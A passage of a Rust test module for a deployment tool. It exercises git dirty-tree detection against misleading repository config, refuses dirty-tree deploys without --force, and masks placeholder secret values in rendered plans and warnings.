    let nested = forced_dirty_version(diff, "nested/\0b\0", "1111\n").await;
    assert_ne!(nested, version);
    let only_nested = forced_dirty_version(diff, "nested/\0", "").await;
    assert_ne!(only_nested, version);
    assert_ne!(only_nested, nested);
    // A file that goes away between the reads leaves a name without a blob id: no id
    // is made of a tree read half.
    let error = forced_dirty(diff, untracked, "1111\n").await.unwrap_err();
    assert!(
        matches!(&error, crate::error::Error::Git(message) if message.contains("changed while it was read")),
        "{error:?}"
    );
}

/// An untracked symlink counts by its target path on an `l <id>` line, never as a
/// regular file's blob id of the same text; and since each name's line comes in name
/// order, which name is the symlink names the tree.
#[tokio::test]
async fn a_forced_dirty_trees_symlinks_name_it_by_their_targets() {
    let diff = "+changed\n";
    let untracked = "f\0link\0";
    let link_second = forced_dirty_version(diff, untracked, "1111\nl 2222\n").await;
    assert_ne!(
        forced_dirty_version(diff, untracked, "l 2222\n1111\n").await,
        link_second,
        "which name is the symlink names the tree"
    );
    assert_ne!(
        forced_dirty_version(diff, untracked, "1111\n2222\n").await,
        link_second,
        "a symlink is not a regular file holding its target"
    );
}

/// Run `script` under `shell` in `cwd`, with `path` as `PATH` and no user or system git
/// config, returning its stdout and asserting it succeeded.
fn run_dirty_tree_script(
    shell: &Path,
    script: &str,
    cwd: &Path,
    path: &std::ffi::OsStr,
) -> Vec<u8> {
    let output = std::process::Command::new(shell)
        .arg("-c")
        .arg(script)
        .current_dir(cwd)
        .env("PATH", path)
        .env("GIT_CONFIG_GLOBAL", "/dev/null")
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .output()
        .unwrap();
    assert!(
        output.status.success(),
        "{}: {}",
        shell.display(),
        String::from_utf8_lossy(&output.stderr)
    );
    output.stdout
}

/// Is `git` on `path`? The real-repository dirty-check tests check nothing without it.
fn git_available(path: &std::ffi::OsStr) -> bool {
    std::process::Command::new("git")
        .arg("--version")
        .env("PATH", path)
        .output()
        .is_ok_and(|o| o.status.success())
}

/// The blob id git gives `content`.
fn git_blob_id(content: &str, path: &std::ffi::OsStr) -> String {
    use std::io::Write as _;
    let mut child = std::process::Command::new("git")
        .args(["hash-object", "--stdin"])
        .env("PATH", path)
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .spawn()
        .unwrap();
    child
        .stdin
        .take()
        .unwrap()
        .write_all(content.as_bytes())
        .unwrap();
    let output = child.wait_with_output().unwrap();
    assert!(output.status.success());
    String::from_utf8(output.stdout).unwrap().trim().to_owned()
}

/// The real blob read over a real repository, from a subdirectory, under the system
/// `sh` and under `BusyBox` (its `sh`, `xargs` and `readlink` leading `PATH`): a
/// dangling symlink, a symlink to a directory, one to a file and one whose target ends
/// in a newline each count by their target path, as git records a symlink; the regular
/// files by their contents; the untracked nested repository not at all — one line per
/// name `dirty_id` counts, in name order.
#[test]
fn the_dirty_tree_blob_read_hashes_symlinks_by_their_targets() {
    use std::os::unix::fs::symlink;

    let system_path = std::env::var_os("PATH").unwrap_or_default();
    if !git_available(&system_path) {
        return;
    }
    let dir = tempfile::tempdir().unwrap();
    let repo = dir.path().join("repo");
    std::fs::create_dir(&repo).unwrap();
    let git = |cwd: &Path, args: &[&str]| {
        let status = std::process::Command::new("git")
            .args(args)
            .current_dir(cwd)
            .env("GIT_CONFIG_GLOBAL", "/dev/null")
            .env("GIT_CONFIG_NOSYSTEM", "1")
            .stdout(std::process::Stdio::null())
            .status()
            .unwrap();
        assert!(status.success(), "git {args:?}");
    };
    git(&repo, &["init", "-q"]);
    std::fs::create_dir(repo.join("d")).unwrap();
    std::fs::write(repo.join("d/inner"), "inner\n").unwrap();
    std::fs::write(repo.join("f"), "hi\n").unwrap();
    std::fs::write(repo.join("with space"), "spaced\n").unwrap();
    symlink("nowhere", repo.join("dangle")).unwrap();
    symlink("d", repo.join("dirlink")).unwrap();
    symlink("f", repo.join("filelink")).unwrap();
    symlink("t\n", repo.join("nl")).unwrap();
    let nested = repo.join("nested");
    std::fs::create_dir(&nested).unwrap();
    git(&nested, &["init", "-q"]);
    std::fs::write(nested.join("x"), "x\n").unwrap();

    let expected = [
        git_blob_id("inner\n", &system_path),
        format!("l {}", git_blob_id("nowhere", &system_path)),
        format!("l {}", git_blob_id("d", &system_path)),
        git_blob_id("hi\n", &system_path),
        format!("l {}", git_blob_id("f", &system_path)),
        format!("l {}", git_blob_id("t\n", &system_path)),
        git_blob_id("spaced\n", &system_path),
    ]
    .join("\n")
        + "\n";

    let untracked = run_dirty_tree_script(
        Path::new("sh"),
        super::checkout::DIRTY_TREE_UNTRACKED,
        &repo.join("d"),
        &system_path,
    );
    assert_eq!(
        untracked,
        b"d/inner\0dangle\0dirlink\0f\0filelink\0nested/\0nl\0with space\0"
    );

    let mut shells = vec![("sh", std::path::PathBuf::from("sh"), system_path.clone())];
    let busybox = std::env::split_paths(&system_path)
        .map(|dir| dir.join("busybox"))
        .find(|candidate| candidate.is_file());
    if let Some(busybox) = busybox {
        let applets = dir.path().join("busybox-applets");
        std::fs::create_dir(&applets).unwrap();
        for applet in ["sh", "xargs", "readlink"] {
            symlink(&busybox, applets.join(applet)).unwrap();
        }
        let mut dirs = vec![applets.clone()];
        dirs.extend(std::env::split_paths(&system_path));
        shells.push((
            "busybox",
            applets.join("sh"),
            std::env::join_paths(dirs).unwrap(),
        ));
    }
    for (label, shell, path) in shells {
        let blobs = run_dirty_tree_script(
            &shell,
            super::checkout::DIRTY_TREE_BLOBS,
            &repo.join("d"),
            &path,
        );
        assert_eq!(String::from_utf8(blobs).unwrap(), expected, "{label}");
    }
}

/// The checkout's own config can't make a tree read clean that holds what `dirty_id`
/// counts: an untracked file under `status.showUntrackedFiles=no`, a submodule with
/// changes under `submodule.<name>.ignore=all` and `diff.ignoreSubmodules`, and a
/// changed file and an untracked one under a `core.fsmonitor` that reports nothing
/// changed (with the untracked cache on, which trusts it). The tracked-change read sees
/// the submodule too, so its commit and dirt name the release, and reads past the
/// monitor, so the change names it.
#[test]
fn the_dirty_check_reads_what_the_checkouts_config_would_hide() {
    let system_path = std::env::var_os("PATH").unwrap_or_default();
    if !git_available(&system_path) {
        return;
    }
    let dir = tempfile::tempdir().unwrap();
    let git = |cwd: &Path, args: &[&str]| {
        let status = std::process::Command::new("git")
            .args([
                "-c",
                "user.name=zap",
                "-c",
                "user.email=zap@example.invalid",
            ])
            .args(["-c", "protocol.file.allow=always"])
            .args(args)
            .current_dir(cwd)
            .env("GIT_CONFIG_GLOBAL", "/dev/null")
            .env("GIT_CONFIG_NOSYSTEM", "1")
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status()
            .unwrap();
        assert!(status.success(), "git {args:?}");
    };
    let sub = dir.path().join("sub");
    std::fs::create_dir(&sub).unwrap();
    git(&sub, &["init", "-q"]);
    std::fs::write(sub.join("f"), "a\n").unwrap();
    git(&sub, &["add", "f"]);
    git(&sub, &["commit", "-q", "-m", "sub"]);
    let repo = dir.path().join("repo");
    std::fs::create_dir(&repo).unwrap();
    git(&repo, &["init", "-q"]);
    std::fs::write(repo.join("tracked"), "x\n").unwrap();
    git(&repo, &["add", "tracked"]);
    git(&repo, &["commit", "-q", "-m", "init"]);
    git(&repo, &["submodule", "add", "-q", "../sub", "sub"]);
    git(&repo, &["commit", "-q", "-m", "submodule"]);
    git(&repo, &["config", "status.showUntrackedFiles", "no"]);
    git(&repo, &["config", "submodule.sub.ignore", "all"]);
    git(&repo, &["config", "diff.ignoreSubmodules", "all"]);
    let read = |script: &str| {
        String::from_utf8(run_dirty_tree_script(
            Path::new("sh"),
            script,
            &repo,
            &system_path,
        ))
        .unwrap()
    };
    assert_eq!(read(super::checkout::DIRTY_TREE_STATUS), "", "a clean tree");

    std::fs::write(repo.join("notes.txt"), "n\n").unwrap();
    assert_eq!(read(super::checkout::DIRTY_TREE_STATUS), "?? notes.txt\n");
    assert_eq!(
        read(super::checkout::DIRTY_TREE_UNTRACKED),
        "notes.txt\0",
        "the id counts it"
    );
    std::fs::remove_file(repo.join("notes.txt")).unwrap();

    std::fs::write(repo.join("sub/f"), "b\n").unwrap();
    assert_eq!(read(super::checkout::DIRTY_TREE_STATUS), " M sub\n");
    assert!(
        read(super::checkout::DIRTY_TREE_DIFF).contains("-dirty"),
        "its commit and dirt name it"
    );
    std::fs::write(repo.join("sub/f"), "a\n").unwrap();
    assert_eq!(read(super::checkout::DIRTY_TREE_STATUS), "", "clean again");

    // a monitor that answers every query with a token and no paths: nothing changed
    git(&repo, &["config", "--unset", "status.showUntrackedFiles"]);
    git(&repo, &["config", "core.fsmonitor", "printf 'tok\\0'; :"]);
    git(&repo, &["config", "core.untrackedCache", "true"]);
    git(&repo, &["status"]);
    std::fs::write(repo.join("tracked"), "y\n").unwrap();
    std::fs::write(repo.join("late.txt"), "l\n").unwrap();
    assert_eq!(read("git status --porcelain"), "", "the monitor hides both");
    assert_eq!(
        read(super::checkout::DIRTY_TREE_UNTRACKED),
        "late.txt\0",
        "the untracked read walks past the cache"
    );
    assert!(
        read(super::checkout::DIRTY_TREE_DIFF).contains("+y\n"),
        "the change names it"
    );
    assert_eq!(
        read("git status --porcelain"),
        "",
        "the diff left the monitor's answer standing"
    );
    assert_eq!(
        read(super::checkout::DIRTY_TREE_STATUS),
        " M tracked\n?? late.txt\n"
    );
}

/// The dirty check compares contents, not what the checkout's index cached about each
/// file: a file rewritten to its old size with its mtime set back, in a checkout that
/// doesn't trust ctime, reads unchanged to a `git status` that trusts the cache, and a
/// file the index marks `assume-unchanged` reads unchanged to any. Both read dirty
/// here, from a subdirectory as well, and both name the release; so does a change
/// under `core.ignoreStat`, a mode change under `core.fileMode=false`, and a CRLF
/// rewrite under `core.autocrlf=true`, and a staged file git ignores still counts.
/// Under `core.splitIndex=true` the reads leave the checkout's `.git` as it was.
#[test]
fn the_dirty_check_reads_contents_not_the_indexs_stat_cache() {
    use std::os::unix::fs::PermissionsExt as _;

    let system_path = std::env::var_os("PATH").unwrap_or_default();
    if !git_available(&system_path) {
        return;
    }
    let dir = tempfile::tempdir().unwrap();
    let repo = dir.path().join("repo");
    std::fs::create_dir_all(repo.join("d")).unwrap();
    let run = |program: &str, args: &[&str]| {
        let status = std::process::Command::new(program)
            .args(args)
            .current_dir(&repo)
            .env("GIT_CONFIG_GLOBAL", "/dev/null")
            .env("GIT_CONFIG_NOSYSTEM", "1")
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status()
            .unwrap();
        assert!(status.success(), "{program} {args:?}");
    };
    let git = |args: &[&str]| {
        let mut all = vec![
            "-c",
            "user.name=zap",
            "-c",
            "user.email=zap@example.invalid",
        ];
        all.extend_from_slice(args);
        run("git", &all);
    };
    git(&["init", "-q"]);
    std::fs::write(repo.join("tracked"), "x\n").unwrap();
    std::fs::write(repo.join("held"), "h\n").unwrap();
    std::fs::write(repo.join(".gitignore"), "*.ignored\n").unwrap();
    git(&["add", "."]);
    git(&["commit", "-q", "-m", "init"]);
    git(&["config", "core.trustctime", "false"]);
    // an mtime well before the index is written, so git reads the entry as settled
    run("touch", &["-d", "@1000000000", "tracked"]);
    git(&["status"]);
    git(&["update-index", "--assume-unchanged", "held"]);
    std::fs::write(repo.join("tracked"), "y\n").unwrap();
    run("touch", &["-d", "@1000000000", "tracked"]);
    std::fs::write(repo.join("held"), "H\n").unwrap();
    let read = |script: &str, cwd: &Path| {
        String::from_utf8(run_dirty_tree_script(
            Path::new("sh"),
            script,
            cwd,
            &system_path,
        ))
        .unwrap()
    };
    assert_eq!(
        read("git status --porcelain", &repo),
        "",
        "the index's cache hides both"
    );
    for cwd in [repo.clone(), repo.join("d")] {
        assert_eq!(
            read(super::checkout::DIRTY_TREE_STATUS, &cwd),
            " M held\n M tracked\n",
            "{cwd:?}"
        );
        let diff = read(super::checkout::DIRTY_TREE_DIFF, &cwd);
        assert!(
            diff.contains("+y\n") && diff.contains("+H\n"),
            "{cwd:?}: {diff}"
        );
    }
    assert_eq!(
        read("git status --porcelain", &repo),
        "",
        "the reads left the checkout's index as it was"
    );

    std::fs::write(repo.join("tracked"), "x\n").unwrap();
    std::fs::write(repo.join("held"), "h\n").unwrap();
    assert_eq!(
        read(super::checkout::DIRTY_TREE_STATUS, &repo),
        "",
        "clean again"
    );
    // `core.ignoreStat` would mark every entry of the copy unchanged as it is made
    git(&["config", "core.ignoreStat", "true"]);
    std::fs::write(repo.join("tracked"), "z\n").unwrap();
    assert_eq!(
        read(super::checkout::DIRTY_TREE_STATUS, &repo),
        " M tracked\n"
    );
    assert!(read(super::checkout::DIRTY_TREE_DIFF, &repo).contains("+z\n"));
    std::fs::write(repo.join("tracked"), "x\n").unwrap();
    git(&["config", "--unset", "core.ignoreStat"]);

    // `core.fileMode=false` would hide a mode change, `core.autocrlf=true` a rewrite to
    // CRLF line endings: both read dirty here, and name the release.
    git(&["config", "core.fileMode", "false"]);
    std::fs::set_permissions(repo.join("tracked"), std::fs::Permissions::from_mode(0o755)).unwrap();
    assert_eq!(
        read("git status --porcelain", &repo),
        "",
        "the mode is ignored"
    );
    assert_eq!(
        read(super::checkout::DIRTY_TREE_STATUS, &repo),
        " M tracked\n"
    );
    assert!(read(super::checkout::DIRTY_TREE_DIFF, &repo).contains("new mode 100755"));
    std::fs::set_permissions(repo.join("tracked"), std::fs::Permissions::from_mode(0o644)).unwrap();
    git(&["config", "--unset", "core.fileMode"]);
    git(&["config", "core.autocrlf", "true"]);
    std::fs::write(repo.join("tracked"), "x\r\n").unwrap();
    assert_eq!(
        read(super::checkout::DIRTY_TREE_STATUS, &repo),
        " M tracked\n"
    );
    assert!(read(super::checkout::DIRTY_TREE_DIFF, &repo).contains("+x\r\n"));
    std::fs::write(repo.join("tracked"), "x\n").unwrap();
    git(&["config", "--unset", "core.autocrlf"]);
    assert_eq!(
        read(super::checkout::DIRTY_TREE_STATUS, &repo),
        "",
        "clean again"
    );

    // Under `core.splitIndex=true` the reads still write nothing into the checkout's
    // `.git`: the copy of the index keeps no shared index there.
    git(&["config", "core.splitIndex", "true"]);
    git(&["status"]);
    let listing = || {
        let mut names: Vec<String> = std::fs::read_dir(repo.join(".git"))
            .unwrap()
            .map(|entry| entry.unwrap().file_name().to_string_lossy().into_owned())
            .collect();
        names.sort();
        names
    };
    let before = listing();
    std::fs::write(repo.join("tracked"), "w\n").unwrap();
    std::fs::write(repo.join("late"), "l\n").unwrap();
    for script in [
        super::checkout::DIRTY_TREE_STATUS,
        super::checkout::DIRTY_TREE_DIFF,
        super::checkout::DIRTY_TREE_UNTRACKED,
        super::checkout::DIRTY_TREE_BLOBS,
    ] {
        read(script, &repo);
    }
    assert_eq!(
        read(super::checkout::DIRTY_TREE_STATUS, &repo),
        " M tracked\n?? late\n"
    );
    assert_eq!(listing(), before, "nothing new in .git");
    std::fs::write(repo.join("tracked"), "x\n").unwrap();
    std::fs::remove_file(repo.join("late")).unwrap();
    git(&["config", "--unset", "core.splitIndex"]);
    std::fs::write(repo.join("staged.ignored"), "s\n").unwrap();
    git(&["add", "-f", "staged.ignored"]);
    assert_eq!(
        read(super::checkout::DIRTY_TREE_STATUS, &repo),
        "A  staged.ignored\n"
    );
    assert!(read(super::checkout::DIRTY_TREE_DIFF, &repo).contains("+s\n"));
    assert_eq!(read(super::checkout::DIRTY_TREE_UNTRACKED, &repo), "");
}

/// The tree's state is part of the plan: a tree dirtied after the review ships
/// different artifacts, under a version of its own (`--force`), so it is a different
/// plan, and the preview says which it saw.
#[tokio::test]
async fn a_tree_dirtied_after_the_review_is_a_different_plan() {
    let clean = Rig::new("def5678")
        .deploy(&DeployOptions::default())
        .await
        .unwrap();
    assert!(!clean.plan.dirty);
    assert!(render_deploy(&clean).contains("  tree: clean\n"));

    let mut rig = Rig::new("def5678").recording(&clean.plan);
    rig.local = rig
        .local
        .with(super::checkout::DIRTY_TREE_STATUS, ok(" M src/app.ts\n"))
        .with(super::checkout::DIRTY_TREE_DIFF, ok("+change\n"))
        .with(super::checkout::DIRTY_TREE_UNTRACKED, ok(""));
    let forced = DeployOptions {
        force: true,
        ..DeployOptions::default()
    };
    let dirty = rig.deploy(&forced).await.unwrap();
    assert!(dirty.plan.dirty);
    assert!(
        dirty.version.starts_with("abc1234-dirty-"),
        "{}",
        dirty.version
    );
    assert!(
        render_deploy(&dirty).contains("  tree: uncommitted changes or untracked files — "),
        "{}",
        render_deploy(&dirty)
    );
    assert_ne!(dirty.plan_hash, clean.plan_hash);

    let report = rig
        .deploy(&DeployOptions {
            force: true,
            ..wetrun_expecting(&clean.plan_hash)
        })
        .await
        .unwrap();
    assert_eq!(report.outcome, refused(&clean.plan_hash));
    assert_eq!(rig.issued_past_the_plan(), Vec::<String>::new());
}

/// A rig whose checkout at `abc1234` has uncommitted changes.
fn dirty_rig(live: &str) -> Rig {
    dirty_rig_with(live, " M src/app.ts\n")
}

/// A rig whose checkout at `abc1234` reads dirty as `status` says.
fn dirty_rig_with(live: &str, status: &str) -> Rig {
    let mut rig = Rig::new(live);
    rig.local = rig
        .local
        .with(super::checkout::DIRTY_TREE_STATUS, ok(status));
    rig
}

/// Without `--force` a dirty tree has no version of its own — the release would ship
/// the tree under the commit's hash, and a later deploy of that commit would read
/// "already at this version" — so a wetrun is refused naming `--force` and the
/// `-dirty-<id>` name, before the target is read and with nothing recorded. The
/// recorded preview it would have bound to is untouched, and binds a wetrun again once
/// the tree is clean. An untracked file alone makes the tree dirty, as it makes the
/// id ([`super::checkout::dirty_id`] counts it).
#[tokio::test]
async fn a_dirty_tree_wetrun_without_force_is_refused() {
    let mut rig = Rig::new("def5678");
    let clean = rig.deploy(&DeployOptions::default()).await.unwrap();
    let before = rig.preview().unwrap();
    let target_reads = rig.target.issued_commands();

    for status in [" M src/app.ts\n", "?? notes.txt\n"] {
        rig.local = dirty_rig_with("def5678", status).local;
        for options in [wetrun(), wetrun_expecting(&clean.plan_hash)] {
            let error = rig.deploy(&options).await.unwrap_err();
            assert!(
                matches!(error, crate::error::Error::DirtyTree),
                "{status:?}: {error:?}"
            );
            let message = error.to_string();
            assert_eq!(
                message,
                format!("{} — nothing ran", super::DIRTY_NEEDS_FORCE)
            );
            assert!(message.contains("--force"), "{message}");
            assert!(message.contains("<hash>-dirty-<id>"), "{message}");
            assert_eq!(error.exit_code(), 2);
        }
        assert_eq!(rig.target.issued_commands(), target_reads, "{status:?}");
        assert_eq!(
            rig.local.issued_commands(),
            vec![super::checkout::DIRTY_TREE_STATUS; 2],
            "{status:?}: nothing past the tree check"
        );
    }
    assert_eq!(rig.preview().unwrap(), before);
    assert_eq!(rig.last_run(), None);
}

/// A dry run of a dirty tree without `--force` previews the plan and says the wetrun
/// it would hit is refused: no hash, nothing recorded, exit 0 — and it is not
/// short-circuited as "already at this version" when the commit is the live release,
/// since the tree is not what that release holds.
#[tokio::test]
async fn a_dirty_tree_dry_run_without_force_previews_the_refusal() {
    for live in ["def5678", "abc1234"] {
        let rig = dirty_rig(live);
        let dry = rig.deploy(&DeployOptions::default()).await.unwrap();
        assert_eq!(dry.outcome, DeployOutcome::DryRunDirty, "{live}");
        assert_eq!(dry.exit_code(), 0);
        assert_eq!(dry.recorded, None);
        assert!(rig.preview().is_none(), "{live}");
        let rendered = render_deploy(&dry);
        assert!(
            rendered.contains(&format!(
                "  (dry-run — a wetrun of this tree is refused, so this plan has no \
                 plan_hash and is not recorded as a preview)\n  DIRTY — {}\n",
                super::DIRTY_NEEDS_FORCE
            )),
            "{rendered}"
        );
        assert!(
            rendered.contains("  tree: uncommitted changes or untracked files — "),
            "{rendered}"
        );
        assert!(!rendered.contains("plan_hash: "), "{rendered}");
        assert!(!rendered.contains("already at this version"), "{rendered}");
    }
}

/// A dirty tree's dry run of a plan that names no one machine is shown as the
/// unbindable preview it is, and still says the other refusal a wetrun would meet.
#[tokio::test]
async fn a_dirty_tree_on_an_unbindable_plan_still_names_force() {
    let _env = crate::resolve::test_env::set(&[("ZAP_T_HOST_TOKEN", "hidden.example.com")]);
    let mut rig = Rig::on(&Text::reference("ZAP_T_HOST_TOKEN"), "def5678");
    rig.local = rig
        .local
        .with(super::checkout::DIRTY_TREE_STATUS, ok(" M src/app.ts\n"));
    let dry = rig.deploy(&DeployOptions::default()).await.unwrap();
    assert!(
        matches!(dry.outcome, DeployOutcome::DryRunUnbindable(_)),
        "{:?}",
        dry.outcome
    );
    assert_eq!(dry.warnings, vec![super::DIRTY_NEEDS_FORCE.to_owned()]);
}

/// A tree that can't be read isn't a clean one: the run stops with a git error
/// before it plans anything.
#[tokio::test]
async fn an_unreadable_tree_is_an_error_not_a_clean_one() {
    let mut rig = Rig::new("def5678");
    rig.local = rig.local.with(
        super::checkout::DIRTY_TREE_STATUS,
        CommandOutput {
            success: false,
            code: 128,
            stdout: String::new(),
            stderr: "fatal: not a git repository".to_owned(),
        },
    );
    let result = rig.deploy(&DeployOptions::default()).await;
    assert!(
        matches!(&result, Err(crate::error::Error::Git(message)) if message.contains(super::checkout::DIRTY_TREE_STATUS)),
        "{result:?}"
    );
    assert!(!rig.local.issued("git rev-parse --short=12 HEAD"));
}

/// The connecting user is part of the plan — the uploaded archive is named for it — so
/// a review made as one user doesn't bind a wetrun connecting as another (a
/// `--bootstrap` run, a changed `target.user`).
#[tokio::test]
async fn a_different_connecting_user_is_a_different_plan() {
    let reviewed = Rig::new("def5678")
        .deploy(&DeployOptions::default())
        .await
        .unwrap();
    assert!(
        render_deploy(&reviewed).contains("/srv/app/.zap-deploy-deploy-abc1234.tar.gz"),
        "{}",
        render_deploy(&reviewed)
    );

    let mut rig = Rig::new("def5678");
    rig.target = rig.target.with_user("root");
    let as_root = rig.deploy(&DeployOptions::default()).await.unwrap();
    assert!(render_deploy(&as_root).contains("/srv/app/.zap-deploy-root-abc1234.tar.gz"));
    assert_ne!(as_root.plan_hash, reviewed.plan_hash);
    let report = rig
        .deploy(&wetrun_expecting(&reviewed.plan_hash))
        .await
        .unwrap();
    assert_eq!(report.outcome, refused(&reviewed.plan_hash));
}

/// The plan a report renders has passed through the masker: a registered secret
/// value that reached a step (here through the operator identity the swap script
/// records) renders as its token. The hash is the computed plan's, so the wetrun
/// that follows still binds to it.
#[tokio::test]
async fn a_secret_in_a_step_renders_masked() {
    let secret_rig = || {
        let mut registry = crate::secret::SecretRegistry::new();
        registry.register("ZAP_T_OPERATOR_SECRET", "hunter2hunter2");
        let mut rig = Rig::new("def5678");
        rig.masker = registry.freeze().unwrap();
        rig.local = rig.local.with("whoami", ok("hunter2hunter2\n"));
        rig
    };
    let dry = secret_rig()
        .deploy(&DeployOptions::default())
        .await
        .unwrap();
    let rendered = render_deploy(&dry);
    assert!(!rendered.contains("hunter2hunter2"), "{rendered}");
    assert!(
        rendered.contains("'\"[MASKED:ZAP_T_OPERATOR_SECRET]@box\"'"),
        "{rendered}"
    );

    // What runs and what the hash addresses is the plan as computed: the wetrun binds
    // to the dry run's hash and issues the script with the value in it.
    let mut rig = secret_rig();
    for step in &dry.plan.steps {
        match &step.action {
            DeployAction::Build { command } | DeployAction::Tarball { command, .. } => {
                rig.local = rig.local.with(command.clone(), ok(""));
            }
            DeployAction::ExtractSwap { script } => {
                let computed = script.replace("[MASKED:ZAP_T_OPERATOR_SECRET]", "hunter2hunter2");
                assert_ne!(&computed, script);
                rig.target = rig.target.with(computed, ok(&format!("{SWAPPED_LINE}\n")));
            }
            DeployAction::Upload { remote } => {
                rig.target = rig.target.with(upload_put(remote), ok(""));
            }
            _ => {}
        }
    }
    let wet = rig.deploy(&wetrun_expecting(&dry.plan_hash)).await.unwrap();
    assert_eq!(wet.outcome, DeployOutcome::Deployed, "{wet:?}");
    assert!(!render_deploy(&wet).contains("hunter2hunter2"));
}

/// A warning that quotes what a failed read said is masked like the plan: a
/// registered secret value in it renders as its token.
#[tokio::test]
async fn a_secret_in_a_warning_renders_masked() {
    let mut registry = crate::secret::SecretRegistry::new();
    registry.register("ZAP_T_PATH_SECRET", "hunter2hunter2");
    let mut rig = Rig::new("def5678").with_deploy(serde_json::json!({
        "artifacts": ["build/"], "path": "/srv/hunter2hunter2",
    }));
    rig.masker = registry.freeze().unwrap();
    // The live-release read has no recording, so it fails and the warning quotes it.
    rig.target = MockConnection::new(HOST).with_user("deploy");
    let dry = rig.deploy(&DeployOptions::default()).await.unwrap();
    let warning = dry
        .warnings
        .iter()
        .find(|warning| warning.starts_with("could not read the live release symlink"))
        .unwrap_or_else(|| panic!("{:?}", dry.warnings));
    assert!(warning.contains("[MASKED:ZAP_T_PATH_SECRET]"), "{warning}");
    assert!(!render_deploy(&dry).contains("hunter2hunter2"));
}

/// Masking the plan can't fail and hand it back unmasked: a registered secret whose
/// value is inside one of the plan's own tokens (`ball` in `tarball`) leaves those
/// tokens alone and the other secret masked.
#[tokio::test]
async fn a_secret_inside_a_plan_token_does_not_unmask_the_plan() {
    let mut registry = crate::secret::SecretRegistry::new();
    registry.register("ZAP_T_OPERATOR_SECRET", "hunter2hunter2");
    registry.register("ZAP_T_SHORT_SECRET", "ball");
    let mut rig = Rig::new("def5678");
    rig.masker = registry.freeze().unwrap();
    rig.local = rig.local.with("whoami", ok("hunter2hunter2\n"));
    let dry = rig.deploy(&DeployOptions::default()).await.unwrap();
    let rendered = render_deploy(&dry);
    assert!(!rendered.contains("hunter2hunter2"), "{rendered}");
    assert!(
        rendered.contains("[MASKED:ZAP_T_OPERATOR_SECRET]@box"),
        "{rendered}"
    );
    // The step is still the tarball step; the text it holds is masked.
    assert!(rendered.contains("(tarball)\n"), "{rendered}");
    assert!(
        rendered.contains("Create tar[MASKED:ZAP_T_SHORT_SECRET] (tarball)"),
        "{rendered}"
    );
}

/// Masked, then escaped: a secret that holds a control character is found while it
/// is still itself, so it renders as its token — not as its escaped spelling, which
/// the masker would no longer recognize.
#[tokio::test]
async fn a_secret_holding_a_control_character_is_masked_before_it_is_escaped() {
    let mut registry = crate::secret::SecretRegistry::new();
    registry.register("ZAP_T_OPERATOR_SECRET", "hunter2\thunter2");
    let mut rig = Rig::new("def5678");
    rig.masker = registry.freeze().unwrap();
    rig.local = rig.local.with("whoami", ok("hunter2\thunter2\n"));
    let dry = rig.deploy(&DeployOptions::default()).await.unwrap();
    let rendered = render_deploy(&dry);
    assert!(
        rendered.contains("'\"[MASKED:ZAP_T_OPERATOR_SECRET]@box\"'"),
        "{rendered}"
    );
    assert!(!rendered.contains("hunter2"), "{rendered}");
}

/// With no apply-managed resources declared the preview says there is nothing to
/// check, and says the same whether or not `--skip-preflight` was passed. A config
/// whose resources were removed after the review is a different plan.
#[tokio::test]
async fn a_plan_says_when_the_preflight_has_nothing_to_check() {
    let reviewed = Rig::new("def5678")
        .deploy(&DeployOptions::default())
        .await
        .unwrap();
    assert!(
        matches!(
            reviewed.plan.preflight,
            DriftPreflight::Checks { resources: 1, .. }
        ),
        "{:?}",
        reviewed.plan.preflight
    );

    let mut rig = Rig::new("def5678").recording(&reviewed.plan);
    rig.config.resources.clear();
    let bare = rig.deploy(&DeployOptions::default()).await.unwrap();
    assert_eq!(bare.plan.preflight, DriftPreflight::NothingDeclared);
    let rendered = render_deploy(&bare);
    assert!(
        rendered.contains("  preflight: no apply-managed resources declared — "),
        "{rendered}"
    );
    assert!(!rendered.contains("are checked for drift"), "{rendered}");
    let skipping = rig
        .deploy(&DeployOptions {
            skip_preflight: true,
            ..DeployOptions::default()
        })
        .await
        .unwrap();
    assert_eq!(skipping.plan_hash, bare.plan_hash);

    assert_ne!(bare.plan_hash, reviewed.plan_hash);
    let report = rig
        .deploy(&wetrun_expecting(&reviewed.plan_hash))
        .await
        .unwrap();
    assert_eq!(report.outcome, refused(&reviewed.plan_hash));
}

/// A host that isn't secret but whose value carries a registered secret is
/// masked too, and the reason says which of the two it may be. It rides only a
/// render that shows the plan: an already-deployed target shows none, so it says
/// nothing about one.
#[tokio::test]
async fn the_unbindable_reason_rides_only_a_shown_plan() {
    let _env = crate::resolve::test_env::set(&[("ZAP_T_DEPLOY_HOST", "db-hunter2hunter2")]);
    let carrying = |live: &str| {
        let mut registry = crate::secret::SecretRegistry::new();
        registry.register("ZAP_T_DB_PASSWORD", "hunter2hunter2");
        let mut rig = Rig::on(&Text::reference("ZAP_T_DEPLOY_HOST"), live);
        rig.masker = registry.freeze().unwrap();
        rig
    };
    let rig = carrying("def5678");
    let dry = rig.deploy(&DeployOptions::default()).await.unwrap();
    assert_eq!(dry.plan.host, "db-[MASKED:ZAP_T_DB_PASSWORD]");
    let DeployOutcome::DryRunUnbindable(reason) = &dry.outcome else {
        panic!("{:?}", dry.outcome);
    };
    // The variable is no secret name, so unmasking it would change nothing: the
    // reason names the secret its value carries and the way out that works.
    assert_eq!(
        reason,
        &format!(
            "the target host `{zap_t_deploy_host}` references `{zap_t_deploy_host}`, \
         whose value carries the secret `{zap_t_db_password}` (a target host must not \
         hold a secret's value: declare it literally, or through a variable that carries \
         none); the plan holds a masking token in its place, so it names no one machine \
         and its hash is the same for every value the reference takes",
            zap_t_deploy_host = shown("ZAP_T_DEPLOY_HOST"),
            zap_t_db_password = shown("ZAP_T_DB_PASSWORD")
        )
    );
    assert!(!reason.contains("unmask"), "{reason}");
    assert!(!reason.contains("hunter2"), "{reason}");
    assert!(!render_deploy(&dry).contains("plan_hash:"));
    assert_eq!(rig.previews_on_disk(), Vec::<String>::new());

    let deployed = carrying("abc1234")
        .deploy(&DeployOptions::default())
        .await
        .unwrap();
    assert_eq!(deployed.outcome, DeployOutcome::AlreadyDeployed);
    assert!(deployed.warnings.is_empty(), "{:?}", deployed.warnings);
    assert!(!render_deploy(&deployed).contains("UNBINDABLE"));
}

/// A git read that fails says what git said — its first line, escaped — so a
/// checkout git won't trust and a directory that is no checkout read differently.
#[tokio::test]
async fn a_git_error_says_what_git_said() {
